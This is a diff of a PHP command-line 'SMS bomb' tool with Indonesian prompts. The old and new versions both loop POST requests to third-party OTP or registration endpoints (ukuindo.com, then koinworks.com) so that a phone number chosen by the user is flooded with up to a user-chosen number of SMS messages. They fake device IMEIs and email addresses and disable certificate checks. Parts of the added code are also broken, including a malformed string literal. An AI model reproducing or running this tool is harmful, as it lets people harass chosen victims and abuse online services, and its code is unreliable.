@@ -1,55 +1,85 @@
 <?php
 
-echo "Masukan nomer target (ex:081288883333): ";
-$nomerHp  = trim(fgets(STDIN));
-echo "Masukan jumlah BOM: ";
-$amount = trim(fgets(STDIN));
 
-if(!empty($nomerHp) and !empty($amount)){
-
-  if($amount > 1000){
     echo "
-Jangan Lebih dari 1000!";
-  }else{
-    for($i=1;$i<=$amount;$i++){
-      $ch = curl_init();
+         ▄              ▄    
+        ▌▒█           ▄▀▒▌   
+        ▌▒▒█        ▄▀▒▒▒▐  
+       ▐▄█▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐   
+     ▄▄▀▒▒▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐   
+   ▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌   
+  ▐▒▒▒▄▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄▒▌  
+  ▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐  
+ ▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌ 
+ ▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌ 
+▌▒▒▒▄██▄▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▐ 
+▐▒▒▐▄█▄█▌▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▒▌
+▐▒▒▐▀▐▀▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▐ 
+ ▌▒▒▀▄▄▄▄▄▄▀▒▒▒▒▒▒▒░▒░▒░▒▒▒▌ 
+ ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▒▄▒▒▐  
+  ▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▄▒▒▒▒▌  
+    ▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀   
+      ▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀     
+         ▀▀▀▀▀▀▀▀▀▀▀▀        
 
-      curl_setopt($ch, CURLOPT_URL, 'https://gateway.ukuindo.com/entrance/v2/register/first');
-      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-      curl_setopt($ch, CURLOPT_POST, 1);
-      curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"'.$nomerHp.'","mail":"lala'.rand(11111,99999).'@gmail.com","channel":"GooglePlay"}');
-      curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+  ____                          
+ | __ )  ___  _ __ ___    ___ _ __ ___  ___ 
+ |  _ \ / _ \| '_ ` _ \  / __| '_ ` _ \/ __|
+ | |_) | (_) | | | | | | \__ \ | | | | \__ \
+ |____/ \___/|_| |_| |_| |___/_| |_| |_|___/
+                  by : amir furqon 
+Bom sms tools 
+Gunakan dengan bijak ! 
+thx to SGB Team.                                                        
+\n";
+echo "[?]Nomer tujuan: +62";
+$no = trim(fgets(STDIN));
+echo "[?]Jumlah : ";
+$jmlh = trim(fgets(STDIN));
+echo "Masukkan Pesan : ";
+$pesan = trim(fgets(STDIN));
 
-      $headers = array();
-      $headers[] = 'Host: gateway.ukuindo.com';
-      $headers[] = 'Accept: application/json';
-      $headers[] = 'Device: ANDROID';
-      $headers[] = 'Imei: '.rand(1111111111,9999999999);
-      $headers[] = 'Version: 48';
-      $headers[] = 'Versioncode: 3.6.5';
-      $headers[] = 'Accept-Language: id_ID';
-      $headers[] = 'Channel: GooglePlay';
-      $headers[] = 'Product: yinni';
-      $headers[] = 'Content-Type: application/json';
-      $headers[] = 'User-Agent: okhttp/3.12.1';
-      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
-      $result = curl_exec($ch);
-      if (curl_errno($ch)) {
-        echo 'Error:' . curl_error($ch);
-      }
-      curl_close($ch);
+$headers = array();
+    $headers[] = 'LANG: en';
+    $headers[] = 'Content-Type: application/json; charset=UTF-8';
+    $headers[] = 'Content-Length: 44';
+    $headers[] = 'Host: phr.gms.digital';
+    $headers[] = 'Connection: close';
+    $headers[] = 'Accept-Encoding: gzip, deflate';
 
-      if(strlen(json_decode($result,true)['data']['tempToken']) > 5){
-        echo "
-Sukses Bom Nomer [".$i."]";
-      }else{
-        echo "
-Gagal Bom";
-      }
-      sleep(2);
+    //otp
+$i = 0;
+while($i < $jmlh) {
+    $gtop = ""{\"email\":\"\",\"phone_no\":\"$no\",\"user_id\":\"\"}";
+    $gotp = curl('https://asgard.koinworks.com/v1/notification/otp/send', $gtop, $headers);
+    $gots = json_decode($gotp[1]); 
+    if($gots == true ){
+        echo $pesan."\n";
     }
+  $i++;
   }
-}else{
-  echo "Masukan semua parameter";
-}
+
+function curl($url, $fields = null, $headers = null)
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        if ($fields !== null) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
+        }
+        if ($headers !== null) {
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        }
+        $result   = curl_exec($ch);
+        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return array(
+            $result,
+            $httpcode
+        );
+    }
